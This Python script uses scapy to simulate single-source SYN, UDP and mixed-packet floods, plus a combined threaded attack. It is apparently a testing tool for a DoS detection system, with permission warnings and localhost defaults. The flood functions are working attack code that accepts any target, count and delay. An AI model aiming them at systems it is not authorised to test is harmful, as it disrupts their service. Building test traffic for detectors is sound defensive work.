"""
DoS Attack Simulation Script for Testing Detection System

This script simulates single-source DoS attacks for testing purposes.
For distributed (DDoS) attacks from multiple IPs, use simulate_ddos.py instead.

Use this to verify that your per-IP detection and mitigation works correctly.

IMPORTANT: Only use this on systems you own or have permission to test!

Usage:
    sudo python3 scripts/simulate_attack.py --target 127.0.0.1 --type syn
"""

from scapy.all import IP, TCP, UDP, ICMP, send, sr1
import sys
import time
import argparse
import ipaddress
import threading
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

# =============================================================================
# CONFIGURATION - Load from config/config.py
# =============================================================================
try:
    from config.config import (
        DEFAULT_ATTACK_TARGET,
        DEFAULT_ATTACK_PORT,
        DEFAULT_PACKET_COUNT,
        DEFAULT_PACKET_DELAY,
    )
    CONFIG_LOADED = True
except ImportError:
    CONFIG_LOADED = False
    DEFAULT_ATTACK_TARGET = "127.0.0.1"
    DEFAULT_ATTACK_PORT = 80
    DEFAULT_PACKET_COUNT = 200
    DEFAULT_PACKET_DELAY = 0.001


def validate_ip_address(ip: str) -> bool:
    """Validate if string is a valid IP address.
    
    Args:
        ip (str): IP address to validate
        
    Returns:
        bool: True if valid IP, False otherwise
    """
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False


def is_private_or_localhost(ip: str) -> bool:
    """Check if IP is private or localhost.
    
    Args:
        ip (str): IP address to check
        
    Returns:
        bool: True if private/localhost, False otherwise
    """
    try:
        ip_obj = ipaddress.ip_address(ip)
        return ip_obj.is_private or ip_obj.is_loopback
    except ValueError:
        return False


def print_banner():
    """Print the script banner"""
    print("="*70)
    print("DDoS ATTACK SIMULATOR - For Testing Purposes Only")
    print("="*70)
    print()


def syn_flood(target_ip, target_port=80, count=200, delay=0.001, silent=False):
    """
    Simulate a SYN flood attack.
    
    Args:
        target_ip (str): Target IP address
        target_port (int): Target port (default: 80)
        count (int): Number of packets to send (default: 200)
        delay (float): Delay between packets in seconds (default: 0.001)
        silent (bool): If True, suppress progress output (default: False)
    """
    if not silent:
        print(f"🔥 Starting SYN Flood Attack")
        print(f"   Target: {target_ip}:{target_port}")
        print(f"   Packets: {count}")
        print(f"   Delay: {delay}s")
        print()
    
    sent = 0
    try:
        for i in range(count):
            # Create SYN packet with random source port
            packet = IP(dst=target_ip) / TCP(dport=target_port, flags='S')
            send(packet, verbose=0)
            sent += 1
            
            if not silent and sent % 50 == 0:
                print(f"   [SYN] Sent: {sent}/{count} packets...")
            
            time.sleep(delay)
    
    except KeyboardInterrupt:
        if not silent:
            print(f"\n⚠️  SYN Attack interrupted")
    except Exception as e:
        if not silent:
            print(f"\n❌ SYN Attack error: {e}")
    
    if not silent:
        print(f"\n✅ SYN Attack complete. Sent {sent} packets.")
    
    return sent


def packet_flood(target_ip, target_port=80, count=150, delay=0.001, silent=False):
    """
    Simulate a general packet flood attack.
    
    Args:
        target_ip (str): Target IP address
        target_port (int): Target port (default: 80)
        count (int): Number of packets to send (default: 150)
        delay (float): Delay between packets in seconds (default: 0.001)
        silent (bool): If True, suppress progress output (default: False)
    """
    if not silent:
        print(f"🔥 Starting Packet Flood Attack")
        print(f"   Target: {target_ip}:{target_port}")
        print(f"   Packets: {count}")
        print(f"   Delay: {delay}s")
        print()
    
    sent = 0
    try:
        for i in range(count):
            # Create various packet types
            if i % 3 == 0:
                packet = IP(dst=target_ip) / TCP(dport=target_port, flags='A')
            elif i % 3 == 1:
                packet = IP(dst=target_ip) / UDP(dport=target_port)
            else:
                packet = IP(dst=target_ip) / ICMP()
            
            send(packet, verbose=0)
            sent += 1
            
            if not silent and sent % 50 == 0:
                print(f"   [PACKET] Sent: {sent}/{count} packets...")
            
            time.sleep(delay)
    
    except KeyboardInterrupt:
        if not silent:
            print(f"\n⚠️  Packet Attack interrupted")
    except Exception as e:
        if not silent:
            print(f"\n❌ Packet Attack error: {e}")
    
    if not silent:
        print(f"\n✅ Packet Attack complete. Sent {sent} packets.")
    
    return sent


def udp_flood(target_ip, target_port=53, count=150, delay=0.001, silent=False):
    """
    Simulate a UDP flood attack.
    
    Args:
        target_ip (str): Target IP address
        target_port (int): Target port (default: 53 for DNS)
        count (int): Number of packets to send (default: 150)
        delay (float): Delay between packets in seconds (default: 0.001)
        silent (bool): If True, suppress progress output (default: False)
    """
    if not silent:
        print(f"🔥 Starting UDP Flood Attack")
        print(f"   Target: {target_ip}:{target_port}")
        print(f"   Packets: {count}")
        print(f"   Delay: {delay}s")
        print()
    
    sent = 0
    try:
        for i in range(count):
            packet = IP(dst=target_ip) / UDP(dport=target_port) / ("X" * 1024)
            send(packet, verbose=0)
            sent += 1
            
            if not silent and sent % 50 == 0:
                print(f"   [UDP] Sent: {sent}/{count} packets...")
            
            time.sleep(delay)
    
    except KeyboardInterrupt:
        if not silent:
            print(f"\n⚠️  UDP Attack interrupted")
    except Exception as e:
        if not silent:
            print(f"\n❌ UDP Attack error: {e}")
    
    if not silent:
        print(f"\n✅ UDP Attack complete. Sent {sent} packets.")
    
    return sent


def combined_attack(target_ip, target_port=80, count=200, delay=0.001):
    """
    Launch all three attack types simultaneously.
    
    Args:
        target_ip (str): Target IP address
        target_port (int): Target port (default: 80)
        count (int): Number of packets per attack type (default: 200)
        delay (float): Delay between packets in seconds (default: 0.001)
    """
    # Validate IP address
    if not validate_ip_address(target_ip):
        print(f"❌ Error: Invalid IP address '{target_ip}'")
        return
    
    if not is_private_or_localhost(target_ip):
        print(f"⚠️  Warning: Target IP {target_ip} is not private/localhost")
        confirm = input("Are you sure you want to proceed? (yes/no): ")
        if confirm.lower() != 'yes':
            print("Attack cancelled.")
            return
    
    print(f"🔥🔥🔥 Starting COMBINED MULTI-VECTOR ATTACK 🔥🔥🔥")
    print(f"   Target: {target_ip}:{target_port}")
    print(f"   Packets per attack: {count}")
    print(f"   Delay: {delay}s")
    print(f"   Attack vectors: SYN Flood + UDP Flood + Packet Flood")
    print()
    
    results = {'syn': 0, 'udp': 0, 'packet': 0}
    start_time = time.time()
    
    # Use ThreadPoolExecutor for better control
    with ThreadPoolExecutor(max_workers=3) as executor:
        print("⚡ Launching all attack vectors simultaneously...")
        print()
        
        # Submit all attacks
        future_syn = executor.submit(syn_flood, target_ip, target_port, count, delay, silent=True)
        future_udp = executor.submit(udp_flood, target_ip, target_port + 1, count, delay, silent=True)
        future_packet = executor.submit(packet_flood, target_ip, target_port + 2, count, delay, silent=True)
        
        # Monitor progress
        try:
            completed = 0
            while completed < 3:
                time.sleep(1)
                status = []
                
                if future_syn.done():
                    if 'syn' not in [k for k, v in results.items() if v > 0]:
                        results['syn'] = future_syn.result() if not future_syn.exception() else 0
                        status.append("✓ SYN")
                        completed += 1
                else:
                    status.append("⚡ SYN")
                
                if future_udp.done():
                    if 'udp' not in [k for k, v in results.items() if v > 0]:
                        results['udp'] = future_udp.result() if not future_udp.exception() else 0
                        status.append("✓ UDP")
                        completed += 1
                else:
                    status.append("⚡ UDP")
                
                if future_packet.done():
                    if 'packet' not in [k for k, v in results.items() if v > 0]:
                        results['packet'] = future_packet.result() if not future_packet.exception() else 0
                        status.append("✓ PACKET")
                        completed += 1
                else:
                    status.append("⚡ PACKET")
                
                print(f"\r   Status: {' | '.join(status)}", end='', flush=True)
        
        except KeyboardInterrupt:
            print("\n\n⚠️  Attack interrupted by user")
            executor.shutdown(wait=False, cancel_futures=True)
            return
    
    duration = time.time() - start_time
    total_packets = sum(results.values())
    
    print("\n")
    print("="*70)
    print("📊 COMBINED ATTACK SUMMARY")
    print("="*70)
    print(f"   Target:           {target_ip}")
    print(f"   Duration:         {duration:.2f} seconds")
    print(f"   Total Packets:    {total_packets}")
    print()
    print(f"   SYN Packets:      {results['syn']}")
    print(f"   UDP Packets:      {results['udp']}")
    print(f"   Mixed Packets:    {results['packet']}")
    print(f"   Packets/second:   {total_packets/duration:.2f}")
    print("="*70)


def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='DDoS Attack Simulator for Testing',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Combined multi-vector attack (SYN + UDP + Packet floods simultaneously)
  sudo python3 simulate_attack.py --target 127.0.0.1 --type all
  
  # SYN flood attack against localhost
  sudo python3 simulate_attack.py --target 127.0.0.1 --type syn
  
  # Packet flood with custom count
  sudo python3 simulate_attack.py --target 192.168.1.10 --type packet --count 300
  
  # UDP flood against DNS port
  sudo python3 simulate_attack.py --target 10.0.0.1 --type udp --port 53

IMPORTANT: Only use on systems you own or have permission to test!
        """
    )
    
    parser.add_argument('--target', '-t', default=DEFAULT_ATTACK_TARGET, 
                       help=f'Target IP address (default: {DEFAULT_ATTACK_TARGET})')
    parser.add_argument('--type', '-T', choices=['syn', 'packet', 'udp', 'all'], 
                       default='all',
                       help='Attack type (default: all - launches all attacks simultaneously)')
    parser.add_argument('--port', '-p', type=int, default=DEFAULT_ATTACK_PORT,
                       help=f'Target port (default: {DEFAULT_ATTACK_PORT})')
    parser.add_argument('--count', '-c', type=int, default=DEFAULT_PACKET_COUNT,
                       help=f'Number of packets to send per attack type (default: {DEFAULT_PACKET_COUNT})')
    parser.add_argument('--delay', '-d', type=float, default=DEFAULT_PACKET_DELAY,
                       help=f'Delay between packets in seconds (default: {DEFAULT_PACKET_DELAY})')
    
    args = parser.parse_args()
    
    print_banner()
    
    print("⚠️  WARNING: This tool is for testing purposes only!")
    print("   Only use on systems you own or have explicit permission to test.")
    print()
    print(f"Attack Configuration:")
    print(f"  Type:   {args.type.upper()}")
    print(f"  Target: {args.target}:{args.port}")
    print(f"  Count:  {args.count} packets")
    print(f"  Delay:  {args.delay}s")
    print()
    
    # Confirm before proceeding
    try:
        response = input("Continue with attack simulation? (yes/no): ")
        if response.lower() not in ['yes', 'y']:
            print("Attack cancelled.")
            sys.exit(0)
    except KeyboardInterrupt:
        print("\nAttack cancelled.")
        sys.exit(0)
    
    print()
    
    # Validate target IP before confirmation
    if not validate_ip_address(args.target):
        print(f"❌ Error: Invalid IP address '{args.target}'")
        sys.exit(1)
    
    # Execute the attack
    if args.type == 'all':
        combined_attack(args.target, args.port, args.count, args.delay)
    elif args.type == 'syn':
        syn_flood(args.target, args.port, args.count, args.delay)
    elif args.type == 'packet':
        packet_flood(args.target, args.port, args.count, args.delay)
    elif args.type == 'udp':
        udp_flood(args.target, args.port, args.count, args.delay)
    
    print()
    print("="*70)
    print("✅ Check your DDoS detector for alerts and blocked IPs!")
    print("="*70)


if __name__ == "__main__":
    # Check if running as root
    import os
    if os.geteuid() != 0:
        print("❌ This script requires root privileges to send packets.")
        print("   Please run with sudo:")
        print(f"   sudo python3 {sys.argv[0]}")
        sys.exit(1)
    
    main()
